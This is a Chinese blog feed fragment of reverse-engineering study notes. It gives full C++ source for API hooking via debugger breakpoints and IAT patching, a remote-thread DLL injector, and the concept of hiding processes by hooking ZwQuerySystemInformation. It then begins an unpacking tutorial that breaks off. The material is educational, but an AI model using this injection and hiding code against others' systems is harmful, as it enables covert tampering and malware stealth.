(OnExceptionDebugEvent(&amp;de))</div><div class="line"><span class="keyword">continue</span>;</div><div class="line">&#125;</div><div class="line"><span class="comment">// Debuggee exit,被调试事件终止  属于SEH异常一种</span></div><div class="line"><span class="keyword">else</span> <span class="keyword">if</span> (EXIT_PROCESS_DEBUG_EVENT == de.dwDebugEventCode)</div><div class="line">&#123;</div><div class="line"><span class="keyword">break</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// Debuggee continue.再次调试事件</span></div><div class="line">ContinueDebugEvent(de.dwProcessId, de.dwThreadId, dwContinueStatus);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">DWORD dwPID;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (argc != <span class="number">2</span>)</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"\nUSAGE : hook.exe &lt;pid&gt;\n"</span>);</div><div class="line"><span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// Attach Process 开始调试</span></div><div class="line">dwPID = atoi(argv[<span class="number">1</span>]);</div><div class="line"><span class="keyword">if</span> (!DebugActiveProcess(dwPID))</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"DebugActiveProcess(%d) failed!!!\n"</span></div><div class="line"><span class="string">"Error Code = %d\n"</span>, dwPID, GetLastError());</div><div class="line"><span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//循环调试</span></div><div class="line">DebugLoop();  <span class="comment">//跳到下一个函数</span></div><div class="line"></div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>若在生成exe文件是出现这个错误“GetModuleHandleW”: 不能将参数 1 从“const char [10]”转换为“LPCWSTR” 解决方法:<br>项目菜单-&gt;属性-&gt;配置属性-&gt;常规-&gt;项目默认值-&gt;字符集改为未设置</p><p>生成hook.exe 额，在调试的时候，运行hook.exe pid后发现nopad卡住啦，尴尬,怀疑可能是要在32位的系统下，然后又在32位的系统下运行，发现并不是系统问题。又怀疑是不是编译的时候开啦ALSR啦，关掉ALSR，还是不行，得看看代码啦。原来是代码错啦，这。。。。</p><p>运行结果:<br><img src="https://i.imgur.com/AX5bTLh.png" alt=""><br>总结: 这是代码动态注入，通过附件进程，触发异常，通过异常获取WriteFile()函数的信息，在WriteFile()函数首地址下断点，然后截取控制流程，再次触发异常，恢复WriteFile()函数首地址，并且获取线程的上下文，然后将WriteFile()函数读取的缓冲区读出，然后转换成目标数据后写入WriteFile()函数的缓冲区，恢复线程上下文，继续运行就可以hook成功啦。 </p><h1 id="方式2——IAT钩取"><a href="#方式2——IAT钩取" class="headerlink" title="方式2——IAT钩取"></a>方式2——IAT钩取</h1><p>IAT的hook原理:在保持运行代码不变的前提下，将IAT中保存的API起始地址变为用户的起始地址。如图:<br>钩取前<br><img src="https://i.imgur.com/LCmH9DI.png" alt=""><br>钩取后<br><img src="https://i.imgur.com/2dd7nvJ.png" alt=""></p><p>下面以计算器为例，讲解IAT的dll的hook.<br>hookiat.dll的hookiat.cpp<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"wchar.h"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"windows.h"</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span> <span class="params">(WINAPI *PFSETWINDOWTEXTW)</span><span class="params">(HWND hWnd, LPWSTR lpString)</span></span>;</div><div class="line">FARPROC g_pOrgFunc = <span class="literal">NULL</span>;</div><div class="line"><span class="function">BOOL WINAPI <span class="title">MySetWindowTextW</span><span class="params">(HWND hWnd, LPWSTR lpString)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">wchar_t</span>* pNum = <span class="string">L"零一二三四五六七八九"</span>;</div><div class="line">    <span class="keyword">wchar_t</span> temp[<span class="number">2</span>] = &#123;<span class="number">0</span>,&#125;;</div><div class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, nLen = <span class="number">0</span>, nIndex = <span class="number">0</span>;</div><div class="line"></div><div class="line">    nLen = wcslen(lpString);</div><div class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; nLen; i++)</div><div class="line">    &#123;</div><div class="line">        <span class="comment">// 将阿拉伯数字转化成中文</span></div><div class="line">        <span class="comment">//  lpString缓冲区 中文的字宽是的2字节</span></div><div class="line">        if( L'0' &lt;= lpString[i] &amp;&amp; lpString[i] &lt;= L'9' )</div><div class="line">        &#123;</div><div class="line">            temp[<span class="number">0</span>] = lpString[i];</div><div class="line">            nIndex = _wtoi(temp);</div><div class="line">            lpString[i] = pNum[nIndex];</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// 调用user32!SetWindowTextW() API</span></div><div class="line">    <span class="comment">//  修改lpString缓冲区的数据</span></div><div class="line">    <span class="keyword">return</span> ((PFSETWINDOWTEXTW)g_pOrgFunc)(hWnd, lpString);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// hook_iat</span></div><div class="line"><span class="function">BOOL <span class="title">hook_iat</span><span class="params">(LPCSTR szDllName, PROC pfnOrg, PROC pfnNew)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">HMODULE hMod; <span class="comment">//hMod=ImageBase 基址</span></div><div class="line">LPCSTR szLibName; </div><div class="line">PIMAGE_IMPORT_DESCRIPTOR pImportDesc; </div><div class="line">PIMAGE_THUNK_DATA pThunk; </div><div class="line">DWORD dwOldProtect, dwRVA; </div><div class="line">PBYTE pAddr; </div><div class="line"></div><div class="line">hMod = GetModuleHandle(<span class="literal">NULL</span>); <span class="comment">//hMod= ImageBase of calc.exe 基址</span></div><div class="line">pAddr = (PBYTE)hMod;  </div><div class="line">pAddr += *((DWORD*)&amp;pAddr[<span class="number">0x3C</span>]); <span class="comment">// pAddr = VA to PE signature (IMAGE_NT_HEADERS)</span></div><div class="line">dwRVA = *((DWORD*)&amp;pAddr[<span class="number">0x80</span>]);  <span class="comment">// dwRVA = RVA to IMAGE_IMPORT_DESCRIPTOR Table</span></div><div class="line">pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)hMod+dwRVA); <span class="comment">// pImportDesc = VA to IMAGE_IMPORT_DESCRIPTOR Table</span></div><div class="line"><span class="comment">//上面几行代码首先从ImageBase开始，经由PE签名找到IDT,plmportDesc中存储着IID(IMAGE_IMPORT_DESCRIPTOR)结构体的起始地址,IDT是由IID组成的数组，要找的IAT，先要查找到这个位置，而在本例中，pImportDesc=0x1012B80，可以用PEview看见。但是这里为什么是80？？？，而我们要找user32.dll,它在下面，所以遍历查找</span></div><div class="line"><span class="keyword">for</span>( ; pImportDesc-&gt;Name; pImportDesc++ )</div><div class="line">&#123;     </div><div class="line">szLibName = (LPCSTR)((DWORD)hMod + pImportDesc-&gt;Name); <span class="comment">//获取user32.dll的库名</span></div><div class="line"><span class="keyword">if</span>( !_stricmp(szLibName, szDllName) )  <span class="comment">// 查找要的user32.dll</span></div><div class="line">&#123;</div><div class="line"><span class="comment">//得到user32.dll库的IAT地址 ，接着在IAT查找需要的函数user32!SetWindowTextW()</span></div><div class="line">pThunk = (PIMAGE_THUNK_DATA)((DWORD)hMod + pImportDesc-&gt;FirstThunk);</div><div class="line"><span class="keyword">for</span>( ; pThunk-&gt;u1.Function; pThunk++ )</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span>( pThunk-&gt;u1.Function == (DWORD)pfnOrg ) <span class="comment">//如果找到user32!SetWindowTextW()</span></div><div class="line">&#123;</div><div class="line">                  </div><div class="line">VirtualProtect((LPVOID)&amp;pThunk-&gt;u1.Function, <span class="number">4</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);       </div><div class="line">                    pThunk-&gt;u1.Function = (DWORD)pfnNew;</div><div class="line">                    VirtualProtect((LPVOID)&amp;pThunk-&gt;u1.Function, <span class="number">4</span>, dwOldProtect, &amp;dwOldProtect);</div><div class="line"><span class="keyword">return</span> TRUE;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">return</span> FALSE;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//dll主函数</span></div><div class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">switch</span>( fdwReason )</div><div class="line">&#123;</div><div class="line"><span class="keyword">case</span> DLL_PROCESS_ATTACH : </div><div class="line">            <span class="comment">//保存API原地址 </span></div><div class="line">           g_pOrgFunc = GetProcAddress(GetModuleHandle(<span class="string">L"user32.dll"</span>), <span class="string">"SetWindowTextW"</span>);</div><div class="line"></div><div class="line">            <span class="comment">// # hook 钩取</span></div><div class="line">            <span class="comment">//   hookiat!MySetWindowText()钩取user32!SetWindowTextW()</span></div><div class="line">hook_iat(<span class="string">"user32.dll"</span>, g_pOrgFunc, (PROC)MySetWindowTextW);</div><div class="line"><span class="keyword">break</span>;</div><div class="line"></div><div class="line"><span class="keyword">case</span> DLL_PROCESS_DETACH :</div><div class="line">            <span class="comment">// # unhook 脱钩</span></div><div class="line">            <span class="comment">//   calc.exe 的IAT 恢复</span></div><div class="line">            hook_iat(<span class="string">"user32.dll"</span>, (PROC)MySetWindowTextW, g_pOrgFunc);</div><div class="line"><span class="keyword">break</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">return</span> TRUE;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>我们再看看hookd.exe的cpp<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"windows.h"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"tlhelp32.h"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"winbase.h"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"tchar.h"</span></span></div><div class="line"></div><div class="line"><span class="comment">//使用方式</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">usage</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"\nInjectDll.exe by ReverseCore\n"</span></div><div class="line"><span class="string">"- blog  : http://www.reversecore.com\n"</span></div><div class="line"><span class="string">"- email : reversecore@gmail.com\n\n"</span></div><div class="line"><span class="string">"- USAGE : hookdiat.exe &lt;i|e&gt; &lt;PID&gt; &lt;dll_path&gt;\n\n"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//钩取hook</span></div><div class="line"><span class="function">BOOL <span class="title">InjectDll</span><span class="params">(DWORD dwPID, LPCTSTR szDllName)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">HANDLE hProcess, hThread;</div><div class="line">LPVOID pRemoteBuf;</div><div class="line">DWORD dwBufSize = (DWORD)(_tcslen(szDllName) + <span class="number">1</span>) * <span class="keyword">sizeof</span>(TCHAR);</div><div class="line">LPTHREAD_START_ROUTINE pThreadProc;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)))</div><div class="line">&#123;</div><div class="line">DWORD dwErr = GetLastError();</div><div class="line"><span class="keyword">return</span> FALSE;</div><div class="line">&#125;</div><div class="line"></div><div class="line">pRemoteBuf = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, dwBufSize, MEM_COMMIT, PAGE_READWRITE);</div><div class="line"></div><div class="line">WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllName, dwBufSize, <span class="literal">NULL</span>);</div><div class="line"></div><div class="line">pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(<span class="string">L"kernel32.dll"</span>), <span class="string">"LoadLibraryW"</span>);</div><div class="line">hThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, pThreadProc, pRemoteBuf, <span class="number">0</span>, <span class="literal">NULL</span>);</div><div class="line">WaitForSingleObject(hThread, INFINITE);</div><div class="line"></div><div class="line">CloseHandle(hThread);</div><div class="line">CloseHandle(hProcess);</div><div class="line"></div><div class="line"><span class="keyword">return</span> TRUE;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//脱钩</span></div><div class="line"><span class="function">BOOL <span class="title">EjectDll</span><span class="params">(DWORD dwPID, LPCTSTR szDllName)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">BOOL bMore = FALSE, bFound = FALSE;</div><div class="line">HANDLE hSnapshot, hProcess, hThread;</div><div class="line">MODULEENTRY32 me = &#123; <span class="keyword">sizeof</span>(me) &#125;;</div><div class="line">LPTHREAD_START_ROUTINE pThreadProc;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (INVALID_HANDLE_VALUE == (hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPID)))</div><div class="line"><span class="keyword">return</span> FALSE;</div><div class="line"></div><div class="line">bMore = Module32First(hSnapshot, &amp;me);</div><div class="line"><span class="keyword">for</span> (; bMore; bMore = Module32Next(hSnapshot, &amp;me))</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span> (!_tcsicmp(me.szModule, szDllName) || !_tcsicmp(me.szExePath, szDllName))</div><div class="line">&#123;</div><div class="line">bFound = TRUE;</div><div class="line"><span class="keyword">break</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (!bFound)</div><div class="line">&#123;</div><div class="line">CloseHandle(hSnapshot);</div><div class="line"><span class="keyword">return</span> FALSE;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)))</div><div class="line">&#123;</div><div class="line">CloseHandle(hSnapshot);</div><div class="line"><span class="keyword">return</span> FALSE;</div><div class="line">&#125;</div><div class="line"></div><div class="line">pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(<span class="string">L"kernel32.dll"</span>), <span class="string">"FreeLibrary"</span>);</div><div class="line">hThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, pThreadProc, me.modBaseAddr, <span class="number">0</span>, <span class="literal">NULL</span>);</div><div class="line">WaitForSingleObject(hThread, INFINITE);</div><div class="line"></div><div class="line">CloseHandle(hThread);</div><div class="line">CloseHandle(hProcess);</div><div class="line">CloseHandle(hSnapshot);</div><div class="line"></div><div class="line"><span class="keyword">return</span> TRUE;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">DWORD _EnableNTPrivilege(LPCTSTR szPrivilege, DWORD dwState)</div><div class="line">&#123;</div><div class="line">DWORD dwRtn = <span class="number">0</span>;</div><div class="line">HANDLE hToken;</div><div class="line"><span class="keyword">if</span> (OpenProcessToken(GetCurrentProcess(),</div><div class="line">TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken))</div><div class="line">&#123;</div><div class="line">LUID luid;</div><div class="line"><span class="keyword">if</span> (LookupPrivilegeValue(<span class="literal">NULL</span>, szPrivilege, &amp;luid))</div><div class="line">&#123;</div><div class="line">BYTE t1[<span class="keyword">sizeof</span>(TOKEN_PRIVILEGES) + <span class="keyword">sizeof</span>(LUID_AND_ATTRIBUTES)];</div><div class="line">BYTE t2[<span class="keyword">sizeof</span>(TOKEN_PRIVILEGES) + <span class="keyword">sizeof</span>(LUID_AND_ATTRIBUTES)];</div><div class="line">DWORD cbTP = <span class="keyword">sizeof</span>(TOKEN_PRIVILEGES) + <span class="keyword">sizeof</span>(LUID_AND_ATTRIBUTES);</div><div class="line"></div><div class="line">PTOKEN_PRIVILEGES pTP = (PTOKEN_PRIVILEGES)t1;</div><div class="line">PTOKEN_PRIVILEGES pPrevTP = (PTOKEN_PRIVILEGES)t2;</div><div class="line"></div><div class="line">pTP-&gt;PrivilegeCount = <span class="number">1</span>;</div><div class="line">pTP-&gt;Privileges[<span class="number">0</span>].Luid = luid;</div><div class="line">pTP-&gt;Privileges[<span class="number">0</span>].Attributes = dwState;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (AdjustTokenPrivileges(hToken, FALSE, pTP, cbTP, pPrevTP, &amp;cbTP))</div><div class="line">dwRtn = pPrevTP-&gt;Privileges[<span class="number">0</span>].Attributes;</div><div class="line">&#125;</div><div class="line"></div><div class="line">CloseHandle(hToken);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">return</span> dwRtn;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//主函数</span></div><div class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, TCHAR* argv[])</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span> (argc != <span class="number">4</span>) <span class="comment">//参数是不是4个</span></div><div class="line">&#123;</div><div class="line">usage();</div><div class="line"><span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// adjust privilege</span></div><div class="line">_EnableNTPrivilege(SE_DEBUG_NAME, SE_PRIVILEGE_ENABLED);</div><div class="line"></div><div class="line"><span class="keyword">if</span> (!_tcsicmp(argv[<span class="number">1</span>], <span class="string">L"i"</span>)) <span class="comment">//判断是钩取</span></div><div class="line">InjectDll((DWORD)_tstoi(argv[<span class="number">2</span>]), argv[<span class="number">3</span>]);</div><div class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!_tcsicmp(argv[<span class="number">1</span>], <span class="string">L"e"</span>))<span class="comment">//判断是脱钩</span></div><div class="line">EjectDll((DWORD)_tstoi(argv[<span class="number">2</span>]), argv[<span class="number">3</span>]);</div><div class="line"></div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>运行结果:<br>钩取<br><img src="https://i.imgur.com/R54UpIg.png" alt=""><br>脱钩<br><img src="https://i.imgur.com/rUsuZTW.png" alt=""></p><p>个人总结:通过PE文件的结构，先获取线程基址，从ImageBase开始，经由PE签名找到IDT：<br>ImageBase-&gt;IDT-&gt;IAT(dll)-&gt;函数</p><h1 id="方式3——进程隐藏"><a href="#方式3——进程隐藏" class="headerlink" title="方式3——进程隐藏"></a>方式3——进程隐藏</h1><p>进程隐藏就是将要隐藏的进程藏在其他的进程中，实现进程隐藏的关键不是进程本身，而是其他进程。其中用户模式下最常用的是ntdll.ZwQuerySystemInformation() API钩取技术。</p><p>假如我们要隐藏test.exe进程，那么就要钩取ProcExp.exe(进程查看器或taskmgr.exe任务管理器)的ntdll.ZwQuerySystemInformation() API，</p><h2 id="2个问题"><a href="#2个问题" class="headerlink" title="2个问题"></a>2个问题</h2><p>1、钩取的进程数<br>如果进程查看器和任务管理器多开几个，那么进程钩取一个，那是不可以的，所以要钩取系统中运行的所有进程。<br>2、新创进程<br>如果当钩取了系统中运行的所有进程，这时又新建一个ProcExp.exe，而这个进程又没有被钩取。</p><h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p>对于上面2个问题，我们隐藏test.exe进程时需要钩取系统中运行的所有进程的ntdll.ZwQuerySystemInformation() API，并且对后面将要启动的所有进程也进行相同的操作(当然这是全自动的啦)，这叫全局钩取。</p><h1 id="来源"><a href="#来源" class="headerlink" title="来源"></a>来源</h1><p>逆向工程核心原理</p><h2 id="最后，文学还是很重要的，借助诗圣两句提高文学素养"><a href="#最后，文学还是很重要的，借助诗圣两句提高文学素养" class="headerlink" title="最后，文学还是很重要的，借助诗圣两句提高文学素养"></a>最后，文学还是很重要的，借助诗圣两句提高文学素养</h2><p>绝代有佳人，幽居在空谷。<br>但见新人笑，那闻旧人哭。<br>——佳人</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;逆向分析之”花”。windows的Hook是程序设计中最为灵活多变的技巧之一。Hook有两种含义:1、系统提供的消息Hook机制;2、自定义的Hook编程技巧，&lt;br&gt;
    
    </summary>
    
      <category term="re" scheme="http://yoursite.com/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>Re_常见的脱壳方法</title>
    <link href="http://yoursite.com/2018/04/12/re_11_tou_ke/"/>
    <id>http://yoursite.com/2018/04/12/re_11_tou_ke/</id>
    <published>2018-04-12T00:49:18.000Z</published>
    <updated>2018-05-15T00:34:58.431Z</updated>
    
    <content type="html"><![CDATA[<p>软件壳出于程序作者想对程序资源压缩、注册保护的目的，把壳分为压缩壳和加密壳(强壳)两种，压缩壳只是为了减小程序体积对资源进行压缩，加密壳是程序输入表等等进行加密保护。<br><a id="more"></a></p><h1 id="壳的工作原理"><a href="#壳的工作原理" class="headerlink" title="壳的工作原理"></a>壳的工作原理</h1><p>某些加壳程序加壳后会修改了原来导入目录表的位置为壳的导入表，这样默认的导入表指向壳部分的导入表，你就看不到原来的导入表的内容了。程序启动后，操作系统为壳的导入表加载，在壳代码运行完成之后，壳代码会跳到原程序的入口点OEP，壳模拟操作系统填充原来导入表IAT，这样保证代码段能正常调用函数。一般壳的工作原理也就是这样了，随着现在加壳加密技术的进步，不是所有加壳软件都会这样。</p><h1 id="脱壳原理"><a href="#脱壳原理" class="headerlink" title="脱壳原理"></a>脱壳原理</h1><p>首先修改被加壳程序的入口点到程序原来的OEP，然后修改PE程序导入表目录地址为原来导入表地址，或者新建一个节，将这个新节作为导入表节，并将原导入表内容写入新节导入表。</p><h1 id="普通壳脱壳"><a href="#普通壳脱壳" class="headerlink" title="普通壳脱壳"></a>普通壳脱壳</h1><p>例如：先用peid查一下壳，发现有壳(这里是upx壳)[查壳工具主要以peid和fileinfo这两个软件为代表]<br><img src="https://i.imgur.com/nI3hfj8.png" alt=""><br>接下里分别用下面5种方法脱壳</p><h2 id="1、单步跟踪法"><a href="#1、单步跟踪法" class="headerlink" title="1、单步跟踪法"></a>1、单步跟踪法</h2><p>一般先f8单步步过，遇见向上的f4跳到下一条语句,然后会发现，一般有很大的跳转（大跨段），比如jmp XXXXXX 或者JE XXXXXX或者有RETN的一般很快就会到程序的OEP</p><h2 id="2、ESP定律法"><a href="#2、ESP定律法" class="headerlink" title="2、ESP定律法"></a>2、ESP定律法</h2><p>原理:利用堆栈平衡<br>OD加载，会看见pushad,运行一步，下硬件断点<br><img src="https://i.imgur.com/reV3ht1.png" alt=""><br>运行,就会在硬件断点的位置啦，删除硬件断点，接着往下执行几步就可以看见OEP啦<br><img src="https://i.imgur.com/1zMXa3o.png" alt=""></p><h2 id="3、两次内存镜像法"><a href="#3、两次内存镜像法" class="headerlink" title="3、两次内存镜像法"></a>3、两次内存镜像法</h2><p>如图:<br><img src="https://i.imgur.com/V9QVnMh.png" alt=""><br>点击运行，到达这里<br><img src="https://i.imgur.com/vIx32jU.png" alt=""><br>接着<br><img src="https://i.imgur.com/WTjRmsT.png" alt=""><br>点击运行<br><img src="https://i.imgur.com/zTFsIUo.png" alt=""></p><h2 id="4、一步到达OEP-对少数壳有用"><a href="#4、一步到达OEP-对少数壳有用" class="headerlink" title="4、一步到达OEP(对少数壳有用)"></a>4、一步到达OEP(对少数壳有用)</h2><p>OD加载后，Ctrl+F，搜索popad,接着f4运行到这里，接着一步步往下找就可以找到OEP啦。</p><h2 id="5、模拟跟踪法"><a href="#5、模拟跟踪法" class="headerlink" title="5、模拟跟踪法"></a>5、模拟跟踪法</h2><p>上面都可以属于模拟跟踪法。</p><h2 id="6、SFX"><a href="#6、SFX" class="headerlink" title="6、SFX"></a>6、SFX</h2><p><img src="https://i.imgur.com/0D2h6Eg.png" alt=""><br>重载后，自动跳到程序入口点</p><h2 id="7、修复IAT"><a href="#7、修复IAT" class="headerlink" title="7、修复IAT"></a>7、修复IAT</h2><p>先找到OEP,先用loadPE脱下壳，然后用ImportREC修复IAT,操作如下:<br>loadPE先dump下文件<br><img src="https://i.imgur.com/kRRTIBH.png" alt=""><br>PEID查<br><img src="https://i.imgur.com/zmcHw4T.png" alt=""><br>ImportREC修复IAT(这里我是手动OEP修改的,有些直接自己获取OEP)<br><img src="https://i.imgur.com/o5bCSh0.png" alt=""><br>接着转储文件选择刚才dump下来的文件，点击运行<br><img src="https://i.imgur.com/LQMaBx6.png" alt=""></p><h1 id="vmprotect脱壳"><a href="#vmprotect脱壳" class="headerlink" title="vmprotect脱壳"></a>vmprotect脱壳</h1><p>这里有vc的程序作为示例:<br>正常的vc的程序的入口是的机器码是: 55 8b ec<br>而vmp的壳的程序，是找不到55 8b ec,这里学习记录一下脱壳方法<br>1、用exeinfo PE查壳<br><img src="https://i.imgur.com/vTGY7cr.png" 